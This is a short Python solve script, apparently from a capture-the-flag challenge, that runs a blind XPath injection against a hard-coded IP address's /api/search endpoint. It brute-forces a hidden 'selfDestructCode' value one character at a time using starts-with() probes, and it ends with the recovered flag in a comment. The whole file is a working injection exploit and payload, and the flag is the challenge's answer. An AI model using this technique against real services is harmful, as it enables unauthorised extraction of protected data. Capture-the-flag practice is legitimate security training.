import requests
import string

HOST = "http://139.59.190.72:31980"


xmlSafe = """0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&*+, -./:;<=>^_`{|}~ """ #removed 

lastChar = '4'
flag = '4'  #start with CHTB for the first half

while lastChar != '}' : 
    for char in xmlSafe:
        response = requests.post( HOST + '/api/search', json={"search": "' or string-length() > 0]/selfDestructCode[starts-with(.,'{0}{1}')] [string-length() > 0 or name='".format(flag, char)})
        try :
            if response.json()["success"] == 1:
                flag += char
                lastChar = char
                print(flag)
                break
        except:
            continue
# Flag : CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}